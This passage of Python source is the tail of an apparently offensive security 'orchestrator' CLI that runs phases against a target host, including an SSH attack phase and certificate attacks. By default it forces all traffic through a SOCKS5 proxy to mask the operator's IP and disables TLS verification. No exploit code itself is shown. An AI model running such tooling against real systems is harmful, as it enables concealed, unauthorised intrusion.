        # 规则8: 协议差异化分析（总是运行）
        if 'proto_norm_diff' in self.enable_phases:
             planned_phases.append('proto_norm_diff')

        # 规则9: SSH攻击（快速失败）
        if 'time_mch_first_door' in self.enable_phases:
            planned_phases.append('time_mch_first_door')

        return list(set(planned_phases))

    async def _critical_proxy_check(self) -> Dict[str, Any]:
        """严格的代理验证 - 失败则中断整个工具链"""
        import requests
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        
        #  确保SOCKS支持可用
        try:
            import urllib3.contrib.socks
        except ImportError:
            try:
                import socks
            except ImportError:
                self.logger.warning("SOCKS支持库未安装，可能影响代理连接")
                pass
        
        result = {'success': False, 'current_ip': None, 'geo_location': 'Unknown', 'error': None}
        
        try:
            #  修复代理URL格式 - 处理缺少密码的情况
            fixed_proxy_url = self._fix_proxy_url_format(self.proxy_url)
            
            session = requests.Session()
            session.verify = False
            session.proxies = {'http': fixed_proxy_url, 'https': fixed_proxy_url}
            session.timeout = 15  # 增加超时时间
            
            #  尝试第一次连接
            try:
                resp = session.get('https://httpbin.org/ip', timeout=15)
                result['current_ip'] = resp.json().get('origin', 'unknown')
                print(f"[+] 代理认证成功: {result['current_ip']}")
                
            except Exception as auth_error:
                # 如果认证失败，尝试使用默认代理
                self.logger.warning(f"[PROXY] 用户代理失败: {auth_error}")
                print(f"[!] 用户代理认证失败，尝试默认代理...")
                
                try:
                    import fingerprint_proxy
                    if hasattr(fingerprint_proxy, 'PROXY_URL') and fingerprint_proxy.PROXY_URL:
                        fallback_proxy = fingerprint_proxy.PROXY_URL
                        session.proxies = {'http': fallback_proxy, 'https': fallback_proxy}
                        resp = session.get('https://httpbin.org/ip', timeout=15)
                        result['current_ip'] = resp.json().get('origin', 'unknown')
                        print(f"[+] 默认代理成功: {result['current_ip']}")
                        fixed_proxy_url = fallback_proxy
                except Exception as fallback_error:
                    raise auth_error  # 抛出原始错误
            
            # 配置重试策略
            retry_strategy = Retry(
                total=2,
                backoff_factor=1,
                status_forcelist=[429, 500, 502, 503, 504],
            )
            adapter = HTTPAdapter(max_retries=retry_strategy)
            session.mount("http://", adapter)
            session.mount("https://", adapter)
            
            print(f"[+] 最终使用代理: {fixed_proxy_url[:50]}***")
            
            # 代理可用性已通过httpbin.org验证，无需再检查目标可达性
            result['success'] = True
            print(f"[+] 代理自检通过!")
                
        except Exception as e:
            result['error'] = str(e)
            
        return result
    
    def _fix_proxy_url_format(self, proxy_url: str) -> str:
        """修复代理URL格式，处理缺少密码或密码被隐藏的情况"""
        if not proxy_url or not proxy_url.startswith('socks5://'):
            return proxy_url
            
        try:
            #  处理密码被***隐藏的情况
            if '***@' in proxy_url:
                # 从fingerprint_proxy.py获取真实的代理URL
                try:
                    import fingerprint_proxy
                    if hasattr(fingerprint_proxy, 'PROXY_URL') and fingerprint_proxy.PROXY_URL:
                        real_proxy = fingerprint_proxy.PROXY_URL
                        self.logger.info(f"[PROXY] Using real proxy URL from fingerprint_proxy")
                        return real_proxy
                except Exception:
                    pass
                
                # 如果找不到真实URL，尝试无认证连接
                parts = proxy_url.split('***@')
                if len(parts) == 2:
                    host_port = parts[1]
                    no_auth_url = f"socks5://{host_port}"
                    self.logger.info(f"[PROXY] Trying no-auth connection to {host_port}")
                    return no_auth_url
            
            # 解析代理URL
            import urllib.parse
            parsed = urllib.parse.urlparse(proxy_url)
            
            # 如果没有密码，添加空密码
            if parsed.username and not parsed.password:
                # 格式：socks5://username@host:port -> socks5://username:@host:port  
                fixed_url = f"socks5://{parsed.username}:@{parsed.hostname}:{parsed.port}"
                self.logger.info(f"[PROXY] Fixed URL format: added empty password")
                return fixed_url
            
            return proxy_url
            
        except Exception as e:
            self.logger.warning(f"[PROXY] URL parsing failed: {e}, using original")
            return proxy_url

    def _summarize(self, results: Dict[str, Any]) -> Dict[str, Any]:
        # Pull risk markers from known phase structures if present
        risk_levels = []
        phases = results.get('phases', {})

        def _phase_level(phase_data: Dict[str, Any]) -> Optional[str]:
            data = phase_data.get('data', {})
            # Common fields across modules
            for key in ('risk_level', 'overall_risk'):
                if key in data:
                    return data[key]
            # Nested locations
            for k in ('summary', 'overall_assessment', 'risk_assessment'):
                if isinstance(data.get(k), dict):
                    if 'risk_level' in data[k]:
                        return data[k]['risk_level']
                    if 'overall_risk' in data[k]:
                        return data[k]['overall_risk']
            return None

        for name, pdata in phases.items():
            lvl = _phase_level(pdata)
            if isinstance(lvl, str):
                risk_levels.append(lvl.upper())

        priority = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'MINIMAL', 'NONE']
        overall = 'NONE'
        for p in priority:
            if p in risk_levels:
                overall = p
                break

        # 简单情报增强
        summary = {
            'overall_risk': overall,
            'phase_count': len(phases),
            'errors': len(results.get('errors') or {}),
            'server_type': self.intel.get_server_type(),
            'domains_found': len(self.intel.get_san_domains())
        }
        
        return summary


# -------- CLI --------

async def _main_async():
    import argparse
    parser = argparse.ArgumentParser(description='Integrated Orchestrator for Security Modules')
    parser.add_argument('host', help='Target hostname')
    parser.add_argument('--ip', help='Target IP address (bypass DNS resolution)')
    parser.add_argument('--tls-port', type=int, default=443, help='TLS port (default: 443)')
    parser.add_argument('--http-port', type=int, default=80, help='HTTP port (default: 80)')
    parser.add_argument('--grpc-port', type=int, default=443, help='gRPC port (default: 443)')
    parser.add_argument('--xds-port', type=int, default=15000, help='xDS port (default: 15000)')
    parser.add_argument('--ssh-port', type=int, default=22000, help='SSH port (default: 22000)')
    parser.add_argument('--timeout', type=float, default=90.0, help='Per-phase timeout seconds (default: 90.0)')
    parser.add_argument('--posture', choices=['intelligent', 'deep', 'paranoid'], default='intelligent', help='Wasm analysis posture')
    parser.add_argument('--sni-list', nargs='+', help='SNI list for TLS 1.3 PSK cross-binding')
    parser.add_argument('--ec-protocols', nargs='+', choices=['tls', 'jwt', 'mtls', 'api_gateway', 'oauth'], help='EC-AOE protocols to test')
    parser.add_argument('--phases', nargs='+', help='Limit to specific phases by name')
    parser.add_argument('--output', '-o', help='Write JSON results to file')
    parser.add_argument('--format', choices=['json', 'report'], default='report', help='Output format (default: report)')
    parser.add_argument('--jsonl-file', help='Append structured events (JSONL) to this file')
    parser.add_argument('--log-file', help='Write orchestrator logs to this file (default: stdout)')
    parser.add_argument('--proxy-file', default='s5url.txt', help='File containing SOCKS5 proxy URL (default: s5url.txt)')
    parser.add_argument('--force-proxy', action='store_true', default=True, help='Force proxy usage - abort if proxy fails (default: True)')
    parser.add_argument('--no-force-proxy', action='store_true', help='Disable force proxy mode')

    args = parser.parse_args()

    # 处理force_proxy逻辑
    force_proxy_mode = args.force_proxy and not args.no_force_proxy
    
    if force_proxy_mode:
        print(f"[!] 强制代理模式：ON (--force-proxy)")
    else:
        print(f"[*] 强制代理模式：OFF (use --no-force-proxy to disable)")
    
    orch = IntegratedOrchestrator(
        host=args.host,
        ip=args.ip,
        tls_port=args.tls_port,
        http_port=args.http_port,
        grpc_port=args.grpc_port,
        xds_port=args.xds_port,
        ssh_port=args.ssh_port,
        timeout=args.timeout,
        posture=args.posture,
        sni_list=args.sni_list,
        ec_protocols=args.ec_protocols,
        enable_phases=args.phases,
        jsonl_file=args.jsonl_file,
        log_file=args.log_file,
        proxy_url=_load_proxy_from_file(args.proxy_file) if not args.no_force_proxy else None,
        force_proxy=force_proxy_mode,
    )

    results = await orch.run()

    if args.format == 'json':
        out = json.dumps(results, indent=2, ensure_ascii=False, default=str)
    else:
        # 详细人类可读报告
        summary = results.get('summary', {})
        phases = results.get('phases', {})
        errors = results.get('errors', {})
        target = results.get('target', {})
        
        lines = []
        lines.append('=' * 80)
        lines.append(' INTEGRATED SECURITY ASSESSMENT REPORT')
        lines.append('=' * 80)
        lines.append(f" Target: {target.get('host', 'Unknown')}")
        lines.append(f" Ports: TLS:{target.get('tls_port', 443)} HTTP:{target.get('http_port', 80)} SSH:{target.get('ssh_port', 22000)} gRPC:{target.get('grpc_port', 443)}")
        lines.append(f" Time: {results.get('timestamp', 'Unknown')}")
        lines.append(f" Overall Risk: {summary.get('overall_risk', 'UNKNOWN')}")
        lines.append(f" Status: {summary.get('phase_count', 0)} phases, {summary.get('errors', 0)} errors")
        lines.append('')
        
        # 显示每个阶段的结果
        lines.append(' PHASE RESULTS:')
        lines.append('-' * 50)
        for phase_name, phase_data in phases.items():
            risk = 'UNKNOWN'
            findings_count = 0
            details = ""
            
            if isinstance(phase_data, dict):
                # 尝试提取风险等级和发现数量
                if 'risk_level' in phase_data:
                    risk = phase_data['risk_level']
                elif 'overall_risk' in phase_data:
                    risk = phase_data['overall_risk']
                if 'findings' in phase_data:
                    findings_count = len(phase_data.get('findings', []))
                elif 'vulnerabilities' in phase_data:
                    findings_count = len(phase_data.get('vulnerabilities', []))
                
                # 特殊处理指纹模块的详细信息
                if phase_name == 'fingerprint':
                    fp_details = []
                    if 'data' in phase_data and 'ssh_fp' in phase_data['data'] and 'result' in phase_data['data']['ssh_fp']:
                        fp_details.append(f"SSH:{len(phase_data['data']['ssh_fp']['result'])}T")
                    if 'data' in phase_data and 'tls_fp' in phase_data['data'] and 'result' in phase_data['data']['tls_fp']:
                        fp_details.append(f"TLS:{len(phase_data['data']['tls_fp']['result'])}T")
                    if 'data' in phase_data and 'http_fp' in phase_data['data'] and 'result' in phase_data['data']['http_fp']:
                        fp_details.append(f"HTTP:{len(phase_data['data']['http_fp']['result'])}P")
                    if 'data' in phase_data and 'cert_rebel_probe' in phase_data['data'] and 'result' in phase_data['data']['cert_rebel_probe']:
                        cert_data = phase_data['data']['cert_rebel_probe']['result']
                        if isinstance(cert_data, tuple) and len(cert_data) >= 2:
                            fp_details.append(f"CERT:{len(cert_data[0])}C")
                    if fp_details:
                        details = f" [{'/'.join(fp_details)}]"
                        risk = 'COLLECTED'
                        
                # 简单情报驱动的phase信息增强
                elif phase_name == 'certificate_attacks':
                    domains = orch.intel.get_san_domains()
                    if domains:
                        details = f" [{len(domains)}domains]"
            
            lines.append(f"   {phase_name}: {risk}{details} ({findings_count} findings)")
        
        # 显示错误信息（如果有）
        if errors:
            lines.append('')
            lines.append(' ERRORS:')
            lines.append('-' * 50)
            for phase_name, error_msg in errors.items():
                lines.append(f"   {phase_name}: {str(error_msg)[:100]}...")
        
        lines.append('')
        lines.append('=' * 80)
        out = '\n'.join(lines)

    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write(out)
        print(f"Results written to: {args.output}")
    else:
        print(out)

    # Exit code based on overall risk
    risk = (results.get('summary') or {}).get('overall_risk', 'NONE')
    mapping = {'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1, 'MINIMAL': 0, 'NONE': 0}
    sys.exit(mapping.get(risk, 0))


def main():
    if sys.platform == 'win32':
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except Exception:
            pass
    asyncio.run(_main_async())


if __name__ == '__main__':
    main()

